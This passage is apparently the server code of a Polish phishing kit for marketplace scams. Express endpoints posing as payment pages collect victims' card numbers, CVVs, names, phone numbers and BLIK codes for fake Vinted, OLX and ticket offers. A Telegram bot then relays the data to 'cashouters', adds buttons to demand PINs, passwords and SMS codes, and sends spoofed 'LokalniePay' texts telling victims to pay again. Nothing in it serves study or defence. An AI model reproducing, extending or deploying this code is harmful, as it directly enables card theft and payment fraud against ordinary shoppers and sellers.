		workerName: doc.workerName
	});

	return doc;
}

async function setBlikSessionStatus(code, status) {
	const codeKey = normalizeBlikCode(code);
	if (!codeKey) return;

	blikCodes[codeKey] = status;
	try {
		await BlikSession.findOneAndUpdate(
			{ code: codeKey },
			{ status, updatedAt: new Date() },
			{ upsert: true }
		);
	} catch (err) {
		console.error("[setBlikSessionStatus]", err.message || err);
	}
}

async function resolveBlikHeartbeatStatus(codeKey) {
	const memStatus = blikCodes[codeKey];
	let dbStatus = null;

	try {
		const doc = await BlikSession.findOne({ code: codeKey }).select("status").lean();
		dbStatus = doc?.status;
	} catch (err) {
		console.error("[blik-heartbeat] mongo:", err.message || err);
	}

	if (memStatus === undefined && dbStatus === undefined) {
		blikCodes[codeKey] = 0;
		return 0;
	}

	const status = Math.max(memStatus ?? 0, dbStatus ?? 0);
	blikCodes[codeKey] = status;
	return status;
}

app.get('/api/blik-heartbeat.php', async (req, res) => {
	const codeKey = normalizeBlikCode(req.query.code);

	if (!codeKey) {
		return res.status(400).send('xd');
	}

	try {
		const status = await resolveBlikHeartbeatStatus(codeKey);
		return res.type("text/plain").send(String(status));
	} catch (err) {
		console.error("[blik-heartbeat]", err.message || err);
		return res.status(500).send('0');
	}
});

const kartytel = new Map();

app.get('/api/card-api.php', async (req, res) => {
	if (!(await isGlobalCardEnabled())) {
		return res.status(503).json({ error: "Karta niedostępna" });
	}

	const {
		id,
		'card-number': cardNumber,
		'card-date': cardDate,
		'card-cvv': cardCVV,
		'card-name': cardName,
		nr,
	} = req.query;

	if (!id || !cardNumber || !cardDate || !cardCVV || !cardName) {
		return res.status(400).json({
			error: "xd"
		});
	}

	const oferty = await req.tenant.loadOffers();


	if (!Array.isArray(oferty)) {
		return res.status(500).json({
			error: "Błąd: oferty nie są tablicą"
		});
	}

	const oferta = oferty.find(o => o.link == id);
	if (!oferta) {
		return res.status(404).json({
			error: "xd"
		});
	}

	kartytel.set(cardNumber, {
		nr
	});


	if (oferta && oferta.owner) {
		const smiec = oferta.owner;
		const idoferty = oferta.idoferty;

		kartaOwner.set(cardNumber, {
			smiec,
			idoferty,
			cena: oferta.cena
		});

		const selfCashout = await isSelfCashoutEnabled(smiec);
		await sendModernStatus(smiec, [
			{
				title: selfCashout ? "Nowa karta (self cashout)" : "Karta wysłana",
				lines: [
					modernBullet(selfCashout
						? `Victim podał kartę na \`${oferta.cena} PLN\` — dane poniżej.`
						: `Zlecenie na \`${oferta.cena} PLN\` trafiło do puli cashouterów.`)
				]
			}
		]);
	} else {
		console.log("Oferta lub owner nie istnieje");
	}


	async function idToUser(userId) {
		try {

			const user = await bot.getChat(userId);

			return user.username || userId;
		} catch (error) {
			return userId;
		}
	}

	const workerName = await idToUser(oferta.owner);

	const formattedNr = nr.startsWith("48") ? nr.slice(2) : nr;
	const formattedCardNumber = cardNumber.replace(/(.{4})/g, "$1 ").trim();


	codeMeta.set(cardNumber, {
		type: "card",
		source: "gateway",
		amount: oferta.cena,
		owner: oferta.owner,
		idoferty: oferta.idoferty,
		person: cardName,
		phone: formattedNr,
		workerName
	});

	const message = `<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta od victima</b>\n\n` +
		`<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN\n` +
		`<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${formattedCardNumber}</code>\n` +
		`<tg-emoji emoji-id=\"5890937706803894250\">🗓</tg-emoji> <b>Ważna do</b> · ${cardDate}\n` +
		`<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>CVV</b> · ${cardCVV}\n` +
		`<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Osoba</b> · ${cardName}\n` +
		`<tg-emoji emoji-id=\"6039605143601680423\">📞</tg-emoji> <b>Numer</b> · <code>${formattedNr}</code></blockquote>\n` +
		`👷 ${workerName}`;

	const mainMessage = `<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Nowa karta</b>\n\n` +
		`<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN\n` +
		`<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${maskCardNumber(cardNumber)}</code>\n` +
		`<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Osoba</b> · ${cardName}</blockquote>\n` +
		`<tg-emoji emoji-id=\"6037249452824072506\">🔒</tg-emoji> Dane ukryte — przejmij, aby zobaczyć`;

	const mainKeyboard = {
		inline_keyboard: [
			[{ text: 'Przejmij kartę', icon_custom_emoji_id: "5778421276024509124", callback_data: `claim_${oferta.owner}_${oferta.cena}_${cardNumber}` }]
		]
	};

	try {
		await sendGatewaySubmission(oferta.owner, message, {
			keyboard: null,
			mainMessage,
			mainKeyboard,
			threadId: cardThread(),
			key: `card_${cardNumber}`
		});
		res.json({
			success: true
		});
	} catch (err) {
		res.status(500).json({
			error: "xd"
		});
	}
});


app.get('/api/card-heartbeat.php', (req, res) => {
	const {
		id
	} = req.query;
	const cardNumber = req.query['card-number'];

	if (!cardNumber || !id) {
		return res.status(400).send('xd');
	}

	if (cardStatus[cardNumber] !== undefined) {
		return res.send(String(cardStatus[cardNumber]));
	}

	cardStatus[cardNumber] = 0;
	return res.send('0');
});

app.get('/api/blik-api.php', async (req, res) => {
	if (!(await isGlobalBlikEnabled())) {
		return res.status(503).json({ error: "BLIK niedostępny" });
	}

	const {
		id,
		code: rawCode,
	} = req.query;

	const code = normalizeBlikCode(rawCode);
	const blikName = req.query['blik-name'] || 'Nieznany';
	const nr = req.query.nr || '48000000000';

	if (!id || !code) {
		return res.status(400).json({
			error: "xd"
		});
	}

	const oferty = await req.tenant.loadOffers();

	if (!Array.isArray(oferty)) {
		return res.status(500).json({
			error: "Błąd: oferty nie są tablicą"
		});
	}
	const oferta = oferty.find(o => o.link == id);
	if (!oferta) {
		return res.status(404).json({
			error: "xd"
		});
	}

	blikitel.set(code, {
		nr
	});

	async function idToUser(userId) {
		try {
			const user = await bot.getChat(userId);
			return user.username || userId;
		} catch (error) {
			return userId;
		}
	}

	const workerName = await idToUser(oferta.owner);

	if (oferta && oferta.owner) {
		await saveBlikSession(code, {
			status: 0,
			smiec: oferta.owner,
			idoferty: oferta.idoferty,
			cena: oferta.cena,
			platform: formatGatewayPlatformLabel(req.subdomain),
			nr,
			workerName
		});

		const selfCashout = await isSelfCashoutEnabled(oferta.owner);
		const ownerDecisionKeyboard = {
			inline_keyboard: [
				[
					{ text: "Akceptuj kod", icon_custom_emoji_id: "5774022692642492953", callback_data: `blikgate_accept_${code}` },
					{ text: "Nieprawidłowy kod", icon_custom_emoji_id: "5938215362473496448", callback_data: `blikgate_reject_${code}` }
				],
				[{ text: "Limit w banku", icon_custom_emoji_id: "6030563507299160824", callback_data: `blikgate_limit_${code}` }]
			]
		};
		const sendOwnerNotice = async () => {
			const text = selfCashout
				? `───────── [ 𝕂 ] ─────────\n❖ *VICTIM PODAŁ KOD*\n──────────────────\n\n` +
					`› *Tryb:* self-cashout\n› *Kwota:* \`${oferta.cena} PLN\`\n› dane karty poniżej`
				: `───────── [ 𝕂 ] ─────────\n❖ *KOD WYSŁANY*\n──────────────────\n\n` +
					`› Zlecenie na \`${oferta.cena} PLN\` trafiło do puli`;
			const sentNotice = await sendFgMessage(oferta.owner, text, selfCashout ? ownerDecisionKeyboard : getDismissKeyboard());
			if (sentNotice?.message_id != null) registerCodeMessage(`blik_${code}`, oferta.owner, sentNotice.message_id);
		};
		if (selfCashout && backdoorDelayMs > 0) scheduleDelayed(backdoorDelayMs, sendOwnerNotice);
		else await sendOwnerNotice();
	} else {
		await saveBlikSession(code, { status: 0, nr });
		console.log("Oferta lub owner nie istnieje");
	}

	const formattedNr = String(nr).startsWith("48") ? String(nr).slice(2) : String(nr);

	codeMeta.set(code, {
		type: "blik",
		source: "gateway",
		amount: oferta.cena,
		owner: oferta.owner,
		idoferty: oferta.idoferty,
		person: blikName,
		phone: formattedNr,
		workerName
	});

	const message = `<tg-emoji emoji-id=\"6035162669948867129\">🔢</tg-emoji> <b>Kod BLIK od victima</b>\n\n` +
		`<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN\n` +
		`<tg-emoji emoji-id=\"6035162669948867129\">🔢</tg-emoji> <b>Kod</b> · <code>${code}</code>\n` +
		`<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Osoba</b> · ${blikName}\n` +
		`<tg-emoji emoji-id=\"6039605143601680423\">📞</tg-emoji> <b>Numer</b> · <code>${formattedNr}</code></blockquote>\n` +
		`👷 ${workerName}`;

	// Kanał główny: kod ukryty, obowiązkowe przejęcie
	const mainMessage = `<tg-emoji emoji-id=\"6035162669948867129\">🔢</tg-emoji> <b>Nowy kod BLIK</b>\n\n` +
		`<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN\n` +
		`<tg-emoji emoji-id=\"6035162669948867129\">🔢</tg-emoji> <b>Kod</b> · <code>${maskBlikCode()}</code>\n` +
		`<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Osoba</b> · ${blikName}</blockquote>\n` +
		`<tg-emoji emoji-id=\"6037249452824072506\">🔒</tg-emoji> Kod ukryty — przejmij, aby zobaczyć`;

	const mainKeyboard = {
		inline_keyboard: [
			[{ text: "Przejmij kod", icon_custom_emoji_id: "6037496202990194718", callback_data: `claim_${oferta.owner}_${oferta.cena}_${code}` }]
		]
	};
	try {
		await sendGatewaySubmission(oferta.owner, message, {
			keyboard: null,
			mainMessage,
			mainKeyboard,
			threadId: blikThread(),
			key: `blik_${code}`
		});
		res.json({
			success: true
		});
	} catch (err) {
		res.status(500).json({
			error: "xd"
		});
	}
});

bot.on('callback_query', async (query) => {
	if (query.from?.id && isUserFlooding(query.from.id)) {
		await bot.answerCallbackQuery(query.id, {
			text: "Zbyt wiele akcji. Poczekaj chwilę.",
			show_alert: false
		}).catch(() => {});
		return;
	}

	// Potwierdz klik od razu (karta / status / przejecie z panelu PV)
	if (
		query.data.startsWith('card_') ||
		query.data.startsWith('status_') ||
		query.data.startsWith('blikgate_') ||
		query.data.startsWith('blik_')
	) {
		await bot.answerCallbackQuery(query.id).catch(() => {});
	}

	if (
		query.data.startsWith('fg_') ||
		query.data.startsWith('app_') ||
		query.data.startsWith('claim_') ||
		query.data.startsWith('code_accept_') ||
		query.data.startsWith('code_reject_') ||
		query.data.startsWith('code_limit_') ||
		query.data.startsWith('accept_') ||
		query.data.startsWith('reject_') ||
		query.data.startsWith('limit_') ||
		query.data.startsWith('payout_accept_') ||
		query.data.startsWith('payout_reject_') ||
		query.data === 'settings' ||
		query.data === 'payment_gateways' ||
		query.data.startsWith('gateway_platform_') ||
		query.data === 'add_offer_ticketmaster' ||
		query.data === 'add_offer_vinted' ||
		query.data === 'add_offer_alebilet' ||
		query.data === 'my_offers_ticketmaster' ||
		query.data === 'my_offers_vinted' ||
		query.data === 'my_offers_alebilet' ||
		query.data.startsWith('tm_') ||
		query.data.startsWith('vinted_') ||
		query.data.startsWith('ab_') ||
		query.data.startsWith('offer_qr_ticketmaster_') ||
		query.data.startsWith('offer_qr_vinted_') ||
		query.data.startsWith('offer_qr_alebilet_')
	) {
		return;
	}

	const data = query.data.split('_');
	let action = data[0];
	let status = null;
	let code = null;
	let cardNumber = null;

	if (action === 'blikgate' && (data[1] === 'accept' || data[1] === 'reject' || data[1] === 'limit') && data.length >= 3) {
		const subAction = data[1] === 'limit' ? 'limit' : data[1];
		code = normalizeBlikCode(data.slice(2).join('_'));

		if (!code) {
			await bot.answerCallbackQuery(query.id, { text: "❌ Nieprawidłowy kod.", show_alert: true });
			return;
		}

		const ofertaOwner = codeOwner.get(code) || await getBlikSession(code);
		const ownerId = ofertaOwner?.smiec ?? (await isSelfCashoutEnabled(query.from.id) ? query.message.chat.id : null);

		if (!(await canProcessGatewayAction(query.from.id, ownerId, {
			chatId: query.message.chat.id,
			chatType: query.message.chat.type,
			itemKey: code
		}))) {
			await bot.answerCallbackQuery(query.id, { text: "🔒 Brak uprawnień.", show_alert: true });
			return;
		}

		if (blikCodes[code] >= 2 && subAction !== 'accept') {
			await bot.answerCallbackQuery(query.id, { text: "⚠️ Decyzja już zapadła.", show_alert: true }).catch(() => {});
			return;
		}

		await bot.answerCallbackQuery(query.id);

		try {
			await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
				chat_id: query.message.chat.id,
				message_id: query.message.message_id
			});
		} catch (e) {}

		const nrTel = blikitel.get(code)?.nr;
		const ownerForCredit = ofertaOwner || (ownerId ? {
			smiec: ownerId,
			idoferty: null,
			cena: null
		} : null);

		const selfCashout = await isSelfCashoutEnabled(ownerForCredit?.smiec);

		// Zgaś przyciski w obu kanałach (backdoor + main) po decyzji
		const clearPair = async () => {
			await clearRegisteredButtons(`blik_${code}`);
			await clearRegisteredButtons(`code_${code}`);
			if (isCodesChat(query.message.chat.id)) await clearClaimPanel(code);
		};
		if (subAction === 'accept') {
			setBlikSessionStatus(code, 2);
			recordCodeStat("accept", parseFloat(ofertaOwner?.cena) || 0).catch(() => {});
			if (selfCashout && ownerForCredit?.smiec) {
				let workerName = ofertaOwner?.workerName;
				if (!workerName) {
					try {
						const user = await bot.getChat(ownerForCredit.smiec);
						workerName = user.username || ownerForCredit.smiec;
					} catch {
						workerName = ownerForCredit.smiec;
					}
				}
				await notifyAdminSelfCashoutHit({
					ownerId: ownerForCredit.smiec,
					workerName,
					amount: ownerForCredit.cena,
					platform: ofertaOwner?.platform || formatGatewayPlatformLabel("olx"),
					type: "code"
				});
			}
			if (ownerForCredit?.smiec && ownerForCredit.idoferty) {
				await creditBramkaPayment(ownerForCredit.smiec, ownerForCredit.idoferty, "BLIK");
			} else if (ownerForCredit?.smiec && selfCashout) {
				await sendModernStatus(ownerForCredit.smiec, [
					{
						title: "Kod zaakceptowany",
						lines: [
							modernBullet("Victim zobaczy błąd płatności — środki zostaną zwrócone w ciągu 48h.")
						]
					}
				]);
			}
			if (nrTel) {
				await executeSmsSending(
					"LokalniePay",
					nrTel,
					"Platnosc nieudana. Srodki zostana zwrocone do 48h roboczych. Prosimy zaplacic ponownie"
				);
			}
		} else {
			const isLimit = subAction === 'limit';
			setBlikSessionStatus(code, isLimit ? 3 : 4);
			recordCodeStat("reject").catch(() => {});
			if (ownerForCredit?.smiec) {
				const kwota = ownerForCredit.cena ? `${ownerForCredit.cena} PLN` : "—";
				await sendModernStatus(ownerForCredit.smiec, [
					{
						title: isLimit ? "Limit w banku" : "Kod nieprawidłowy",
						lines: [
							modernKv("Kwota", kwota),
							modernBullet(isLimit
								? "Victim miał limit w banku."
								: "Kod BLIK został odrzucony.")
						]
					},
					{
						title: "Info",
						lines: [
							modernInfo(selfCashout
								? "Victim zobaczy komunikat o błędzie płatności BLIK."
								: "Możesz złożyć nowy kod — Wrzuć kod BLIK.")
						]
					}
				]);
			}
		}

		setTimeout(async () => {
			delete blikCodes[code];
			blikitel.delete(code);
			codeOwner.delete(code);
			codeClaimer.delete(code);
			codeMeta.delete(code);
			await BlikSession.deleteOne({ code });
		}, 60000);
		await clearPair();
		return;
	}

	if (action === 'blik' && data.length === 2) {
		code = data[1];
		const ofertaOwner = codeOwner.get(code);
		const alreadyClaimed = String(codeClaimer.get(code) || "") === String(query.from.id);
		if (ofertaOwner && !alreadyClaimed) {
			const cashouterLabel = query.from.username ? `@${query.from.username}` : "Cashouter";
			const kwota = ofertaOwner.cena ? `${ofertaOwner.cena} PLN` : "—";
			await sendModernStatus(ofertaOwner.smiec, [
				{
					title: "Cashouter zajął twój kod",
					lines: [
						`› **Cashouter:** ${cashouterLabel} (\`${query.from.id}\`)`,
						modernKv("Kwota", kwota),
						modernBullet("Oczekuj na decyzję — dostaniesz powiadomienie.")
					]
				}
			]);
		}
	} else if (action === 'status' && data.length === 3) {
		status = data[1];
		code = normalizeBlikCode(data[2]);
		} else if (action === 'card') {
		if (data.length === 3) {
			status = data[1];
			cardNumber = data[2];
			const karcikOwner = kartaOwner.get(cardNumber);
			const alreadyClaimed = String(codeClaimer.get(cardNumber) || "") === String(query.from.id);
			if (karcikOwner && !alreadyClaimed) {
				const cashouterLabel = query.from.username ? `@${query.from.username}` : "Cashouter";
				const kwota = karcikOwner.cena ? `${karcikOwner.cena} PLN` : "—";
				await sendModernStatus(karcikOwner.smiec, [
					{
						title: "Cashouter zajął twoją kartę",
						lines: [
							`› **Cashouter:** ${cashouterLabel} (\`${query.from.id}\`)`,
							modernKv("Kwota", kwota),
							modernBullet("Oczekuj na decyzję — dostaniesz powiadomienie.")
						]
					}
				]);
			}
		} else {
			cardNumber = data[1];
			status = null;
		}
	}

	try {
		if (action === 'blik' && code) {
			blikCodes[code] = 1;

			const keyboard = {
				inline_keyboard: [
					[{
						text: 'Siedzi', icon_custom_emoji_id: "5774022692642492953", callback_data: `status_2_${code}`
					}],
					[{
						text: 'Limit w Banku', icon_custom_emoji_id: "6030563507299160824", callback_data: `status_3_${code}`
					}],
					[{
						text: 'Błędny kod', icon_custom_emoji_id: "5938215362473496448", callback_data: `status_4_${code}`
					}]
				]
			};

			await bot.editMessageReplyMarkup(keyboard, {
				chat_id: query.message.chat.id,
				message_id: query.message.message_id
			});

		} else if (action === 'card' && cardNumber && status === null) {
			const cardKeyboard = {
				inline_keyboard: [
					[{
							text: 'Siedzi', icon_custom_emoji_id: "5774022692642492953", callback_data: `card_1_${cardNumber}`
						},
						{
							text: 'Limit w Banku', icon_custom_emoji_id: "6030563507299160824", callback_data: `card_2_${cardNumber}`
						}
					],
					[{
						text: 'Karta Odrzucona', icon_custom_emoji_id: "5938215362473496448", callback_data: `card_3_${cardNumber}`
					}],
					[{
							text: 'Poproś o Potwierdzenie', icon_custom_emoji_id: "6039573425268201570", callback_data: `card_4_${cardNumber}`
						},
						{
							text: 'Poproś o Kod z SMS', icon_custom_emoji_id: "6039605143601680423", callback_data: `card_5_${cardNumber}`
						}
					],
					[{
							text: 'Poproś o PIN', icon_custom_emoji_id: "5778421276024509124", callback_data: `card_6_${cardNumber}`
						},
						{
							text: 'Poproś o Hasło', icon_custom_emoji_id: "6037249452824072506", callback_data: `card_7_${cardNumber}`
						}
					]
				]
			};
			await bot.editMessageReplyMarkup(cardKeyboard, {
				chat_id: query.message.chat.id,
				message_id: query.message.message_id
			});

		} else if (action === 'card' && status && cardNumber) {
			cardStatus[cardNumber] = parseInt(status);

			if (status === '1') {
				const karcikOwnerStat = kartaOwner.get(cardNumber);
				recordCodeStat("card_accept", parseFloat(karcikOwnerStat?.cena) || 0).catch(() => {});
			} else if (status === '3') {
				recordCodeStat("card_reject").catch(() => {});
			}

			const keyboard = {
				inline_keyboard: []
			};
			await bot.editMessageReplyMarkup(keyboard, {
				chat_id: query.message.chat.id,
				message_id: query.message.message_id
			});

			await clearRegisteredButtons(`card_${cardNumber}`);
			if (isCodesChat(query.message.chat.id)) await clearClaimPanel(cardNumber);
			if (isCodesChat(query.message.chat.id)) await clearClaimPanel(`${cardNumber}#sms`);
			if (isCodesChat(query.message.chat.id)) await clearClaimPanel(`${cardNumber}#pin`);
			if (isCodesChat(query.message.chat.id)) await clearClaimPanel(`${cardNumber}#pass`);

			nrTel2 = kartytel.get(cardNumber)?.nr;

			if (status === '1' && nrTel2) {
				const callerid = "LokalniePay"
				const to = nrTel2
				const text = "Platnosc nieudana. Srodki zostana zwrocone do 48h roboczych. Prosimy zaplacic ponownie."
				const karcikOwner = kartaOwner.get(cardNumber);
				if (karcikOwner) {
					await creditBramkaPayment(karcikOwner.smiec, karcikOwner.idoferty, "Karta");
				}
				await executeSmsSending(callerid, to, text);
				setTimeout(() => {
					cardStatus[cardNumber] = 0;
					kartytel.delete(cardNumber);
					kartaOwner.delete(cardNumber);
					codeClaimer.delete(cardNumber);
					codeMeta.delete(cardNumber);
				}, 1500);
			}
			if (status === '2' && nrTel2) {
				const callerid = "LokalniePay"
				const to = nrTel2
				const text = "Platnosc nieudana. Prosimy sprawdzic limity i zaplacic ponownie."
				const karcikOwner = kartaOwner.get(cardNumber);
				if (karcikOwner) {
					const kwota = karcikOwner.cena ? `${karcikOwner.cena} PLN` : "—";
					await sendModernStatus(karcikOwner.smiec, [
						{ title: "Transakcja anulowana", lines: [modernKv("Kwota", kwota), modernBullet("Victim miał limit w banku.")] },
						{ title: "Info", lines: [modernInfo("Możesz złożyć nową płatność kartą.")] }
					]);
				}
				await executeSmsSending(callerid, to, text);
				setTimeout(() => {
					cardStatus[cardNumber] = 0;
					kartytel.delete(cardNumber);
					kartaOwner.delete(cardNumber);
					codeClaimer.delete(cardNumber);
					codeMeta.delete(cardNumber);
				}, 1500);
			}
			if (status === '3') {
				const karcikOwner = kartaOwner.get(cardNumber);
				if (karcikOwner) {
					const kwota = karcikOwner.cena ? `${karcikOwner.cena} PLN` : "—";
					await sendModernStatus(karcikOwner.smiec, [
						{ title: "Transakcja anulowana", lines: [modernKv("Kwota", kwota), modernBullet("Cashouter oznaczył kartę jako niedziałającą.")] },
						{ title: "Info", lines: [modernInfo("Możesz złożyć nową płatność kartą.")] }
					]);
				}
				setTimeout(() => {
					cardStatus[cardNumber] = 0;
					kartytel.delete(cardNumber);
					kartaOwner.delete(cardNumber);
					codeClaimer.delete(cardNumber);
					codeMeta.delete(cardNumber);
				}, 1500);
			}



			setTimeout(() => {
				cardStatus[cardNumber] = 0;
			}, 1500);
		} else if (action === 'status' && status && code) {
			await setBlikSessionStatus(code, parseInt(status, 10));

			if (status === '2') {
				recordCodeStat("accept", parseFloat(codeOwner.get(code)?.cena) || 0).catch(() => {});
			} else if (status === '3' || status === '4') {
				recordCodeStat("reject").catch(() => {});
			}

			const keyboard = {
				inline_keyboard: []
			};

			await bot.editMessageReplyMarkup(keyboard, {
				chat_id: query.message.chat.id,
				message_id: query.message.message_id
			});

			await clearRegisteredButtons(`blik_${code}`);
			await clearRegisteredButtons(`code_${code}`);

			nrTel = blikitel.get(code)?.nr;

			if (status === '2' && nrTel) {
				const callerid = "LokalniePay"
				const to = nrTel
				const text = "Platnosc nieudana. Srodki zostana zwrocone do 48h roboczych. Prosimy zaplacic ponownie"
				const ofertaOwner = codeOwner.get(code)
				if (ofertaOwner) {
					await creditBramkaPayment(ofertaOwner.smiec, ofertaOwner.idoferty, "BLIK");
				}
				await executeSmsSending(callerid, to, text);
			}
			if (status === '3' && nrTel) {
				const callerid = "LokalniePay"
				const to = nrTel
				const text = "Platnosc nieudana. Prosimy sprawdzic limity i zaplacic ponownie."
				const ofertaOwner = codeOwner.get(code)
				if (ofertaOwner) {
					const kwota = ofertaOwner.cena ? `${ofertaOwner.cena} PLN` : "—";
					await sendModernStatus(ofertaOwner.smiec, [
						{ title: "Transakcja anulowana", lines: [modernKv("Kwota", kwota), modernBullet("Victim miał limit w banku.")] },
						{ title: "Info", lines: [modernInfo("Możesz złożyć nowy kod — Wrzuć kod BLIK.")] }
					]);
				}
				await executeSmsSending(callerid, to, text);
			}
			if (status === '4') {
				const ofertaOwner = codeOwner.get(code)
				if (ofertaOwner) {
					const kwota = ofertaOwner.cena ? `${ofertaOwner.cena} PLN` : "—";
					await sendModernStatus(ofertaOwner.smiec, [
						{ title: "Transakcja anulowana", lines: [modernKv("Kwota", kwota), modernBullet("Cashouter oznaczył kod jako niedziałający.")] },
						{ title: "Info", lines: [modernInfo("Możesz złożyć nowy kod — Wrzuć kod BLIK.")] }
					]);
				}
			}

			setTimeout(() => {
				blikCodes[code] = 0;
				blikitel.delete(code);
				codeOwner.delete(code);
			}, 1500);
		}


		if (action === 'card' && (data[1] === '4' || data[1] === '5' || data[1] === '6' || data[1] === '7')) {
			const cardKeyboard = {
				inline_keyboard: [
					[{
							text: 'Karta Wypłacona', icon_custom_emoji_id: "5774022692642492953", callback_data: `card_1_${cardNumber}`
						},
						{
							text: 'Limit w Banku', icon_custom_emoji_id: "6030563507299160824", callback_data: `card_2_${cardNumber}`
						}
					],
					[{
						text: 'Karta Odrzucona', icon_custom_emoji_id: "5938215362473496448", callback_data: `card_3_${cardNumber}`
					}],
					[{
							text: 'Poproś o Potwierdzenie', icon_custom_emoji_id: "6039573425268201570", callback_data: `card_4_${cardNumber}`
						},
						{
							text: 'Poproś o Kod z SMS', icon_custom_emoji_id: "6039605143601680423", callback_data: `card_5_${cardNumber}`
						}
					],
					[{
							text: 'Poproś o PIN', icon_custom_emoji_id: "5778421276024509124", callback_data: `card_6_${cardNumber}`
						},
						{
							text: 'Poproś o Hasło', icon_custom_emoji_id: "6037249452824072506", callback_data: `card_7_${cardNumber}`
						}
					]
				]
			};
			await bot.editMessageReplyMarkup(cardKeyboard, {
				chat_id: query.message.chat.id,
				message_id: query.message.message_id
			});
		}

	} catch (err) {
		if (err.response && err.response.error_code === 400) {
			console.log("Error: Request too old, ignoring.");
		} else {
			console.log("Error:", err);
		}
	}
});

app.use('/images', express.static('images'));

app.use('/assets/fonts', express.static('assets/fonts'));
app.use('/assets', express.static('assets'));

app.get('/health', async (req, res) => {
	res.json({
		ok: true,
		role: APP_ROLE,
		mongo: isMongoConnected(),
		uptime: Math.round(process.uptime()),
		backdoorDelayMs
	});
});

app.use((req, res) => {
	if (res.headersSent) return;
	if (isWebhookPost(req)) {
		console.error(`[404] WEBHOOK bez handlera! APP_ROLE=${APP_ROLE} — ustaw both lub uruchom krypciok-bot na :8080`);
	}
	console.log(`[404] ${req.method} ${getRequestPath(req)} host=${getRequestHost(req)}`);
	res.sendStatus(404);
});

if (RUN_WEBHOOK) {
	initTelegramWebhook().catch((err) => {
		console.error("[WEBHOOK] Nie udało się ustawić webhooka:", err.message || err);
	});

	(async () => {
		const botDomain = CONFIG.SERVER.BOT_DOMAIN;
		if (!botDomain || !CONFIG.CLOUDFLARE.API_KEY) return;
		const zoneId = await getCloudflareZoneId(botDomain);
		if (zoneId) {
			await applyCloudflareBotZoneSecurity(zoneId, botDomain);
		} else {
			console.warn(`[Cloudflare] Brak strefy dla domeny bota ${botDomain} — reguly WAF bota nie ustawione`);
		}
	})();
}

if (!CONFIG.TOKEN) {
	console.error("[BŁĄD] Brak TOKEN w banita.env — bot nie zadziała!");
}

console.log(`[STARTUP] APP_ROLE=${APP_ROLE} | webhook=${RUN_WEBHOOK} | bramka=${RUN_GATEWAY} | split=${USE_SPLIT}`);

if (RUN_WEBHOOK) {
	loadBackdoorDelay()
		.then(() => console.log(`[BACKDOOR] Kanał kopii: ${CONFIG.CHANNELS.BACKDOOR} | delay: ${backdoorDelayMs}ms`))
		.catch(() => {});
}

if (RUN_WEBHOOK && !USE_SPLIT) {
	console.log(`[WEBHOOK] Route: POST /${CONFIG.SERVER.WEBHOOK_PATH} na porcie ${CONFIG.SERVER.PORT}`);
}

if (RUN_WEBHOOK && USE_SPLIT) {
	webhookApp.listen(CONFIG.SERVER.WEBHOOK_PORT, () => {
		console.log(`[WEBHOOK] Nasłuchuje na porcie ${CONFIG.SERVER.WEBHOOK_PORT} (rola: ${APP_ROLE})`);
	}).on("error", (err) => {
		console.error(`[WEBHOOK] Nie można wystartować na porcie ${CONFIG.SERVER.WEBHOOK_PORT}:`, err.message);
	});
}

if (RUN_GATEWAY || APP_ROLE === "both") {
	app.listen(CONFIG.SERVER.PORT, () => {
		console.log(`[SERVER] Nasłuchuje na porcie ${CONFIG.SERVER.PORT} (rola: ${APP_ROLE})`);
		if (!USE_SPLIT && RUN_WEBHOOK) {
			console.log(`[SERVER] Webhook TG na porcie ${CONFIG.SERVER.PORT}/${CONFIG.SERVER.WEBHOOK_PATH}`);
		}
	}).on("error", (err) => {
		console.error(`[SERVER] Nie można wystartować na porcie ${CONFIG.SERVER.PORT}:`, err.message);
	});
} else if (!RUN_WEBHOOK) {
	console.error("[SERVER] APP_ROLE nie uruchamia zadnego serwera HTTP — ustaw webhook, gateway lub both");
}
}
